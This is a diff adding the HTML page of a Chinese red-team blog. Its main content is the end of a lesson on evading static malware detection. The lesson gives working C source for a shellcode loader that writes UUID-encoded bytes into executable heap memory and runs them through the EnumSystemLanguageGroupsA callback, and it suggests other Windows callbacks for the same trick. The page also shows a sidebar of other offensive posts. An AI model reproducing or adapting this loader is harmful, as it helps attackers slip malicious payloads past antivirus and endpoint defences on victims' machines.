+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+	<span class="kt">int</span> <span class="n">dwNum</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+
+	<span class="n">HANDLE</span> <span class="n">hMemory</span> <span class="o">=</span> <span class="n">HeapCreate</span><span class="p">(</span><span class="n">HEAP_CREATE_ENABLE_EXECUTE</span> <span class="o">|</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">hMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">PVOID</span> <span class="n">pMemory</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hMemory</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+	
+	<span class="n">DWORD_PTR</span> <span class="n">CodePtr</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pMemory</span><span class="p">;</span>
+
+	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwNum</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">CodePtr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="n">RPC_STATUS</span>	<span class="n">status</span> <span class="o">=</span> <span class="n">UuidFromStringA</span><span class="p">(</span><span class="n">RPC_CSTR</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="p">(</span><span class="n">UUID</span><span class="o">*</span><span class="p">)</span><span class="n">CodePtr</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">RPC_S_OK</span><span class="p">)</span> <span class="p">{</span>
+
+			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="n">CodePtr</span> <span class="o">+=</span> <span class="mi">16</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">pMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">EnumSystemLanguageGroupsA</span><span class="p">((</span><span class="n">LANGUAGEGROUP_ENUMPROCA</span><span class="p">)</span><span class="n">pMemory</span><span class="p">,</span> <span class="n">LGRPID_INSTALLED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="n">FALSE</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">// 加载成功</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b3c7ed47da69c8709588b47e44476eb5.png" alt="2021-02-08-20-52-53" /></p>
+
+<h2 id="0x04-windows-call-back函数">0x04 Windows CALL BACK函数</h2>
+
+<p>CALL BACK意为回调，是定义一个函数，由系统某个事件或用户的动作自动触发的函数，因此调用者不是用户。</p>
+
+<p>通过MSDN直接搜索Callback/Proc关键字就能发现一些回调函数：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/40db0428aca1e6e105c2e7550230cf8d.png" alt="2021-02-08-20-59-11" /></p>
+
+<p>例如：</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">HINTERNET</span> <span class="n">hOpen</span><span class="p">;</span>                       <span class="c1">// Root HINTERNET handle</span>
+<span class="n">INTERNET_STATUS_CALLBACK</span> <span class="n">iscCallback</span><span class="p">;</span>  <span class="c1">// Holds the callback function</span>
+
+<span class="c1">// Create the root HINTERNET handle.</span>
+<span class="n">hOpen</span> <span class="o">=</span> <span class="n">InternetOpen</span><span class="p">(</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Test Application"</span><span class="p">),</span>
+                      <span class="n">INTERNET_OPEN_TYPE_PRECONFIG</span><span class="p">,</span>
+                      <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="c1">// Set the status callback function.</span>
+<span class="n">iscCallback</span> <span class="o">=</span> <span class="n">InternetSetStatusCallback</span><span class="p">(</span> <span class="n">hOpen</span><span class="p">,</span> <span class="p">(</span><span class="n">INTERNET_STATUS_CALLBACK</span><span class="p">)</span><span class="n">CallMaster</span> <span class="p">);</span>
+
+<span class="kt">void</span> <span class="n">CALLBACK</span> <span class="nf">CallMaster</span><span class="p">(</span> <span class="n">HINTERNET</span><span class="p">,</span>
+    <span class="n">DWORD_PTR</span><span class="p">,</span>
+    <span class="n">DWORD</span><span class="p">,</span>
+    <span class="n">LPVOID</span><span class="p">,</span>
+    <span class="n">DWORD</span>
+<span class="p">);</span>
+
+</code></pre></div></div>
+
+<p>如果CallMaster指向的是一块可执行属性的内存，那么就可以加载Shellcode。</p>
+
+<p>这篇文章中介绍了如何发现其他带有回调的<a href="http://ropgadget.com/posts/abusing_win_functions.html">Windows API</a>。</p>
+
+<h2 id="参考">参考</h2>
+
+<ul>
+  <li>http://www.cn0sec.cn/index.php/archives/337/</li>
+  <li>http://ropgadget.com/posts/abusing_win_functions.html</li>
+</ul>
+-->
+          本节课，使用UUID的方式存储Shellcode，再介绍一些CALL BACK函数的特性来加载Shellcode。
+          <p>
+            <a class="post-link" href="/archivers/2021-02-08/1">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+  </ul>
+  
+  <!-- Pagination links -->
+<div class="pagination">
+  
+    <span class="previous">PREV</span>
+  
+  <span class="page_number ">1 of 34</span>
+  
+    <a href="/page2" class="next">NEXT</a>
+  
+</div>
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
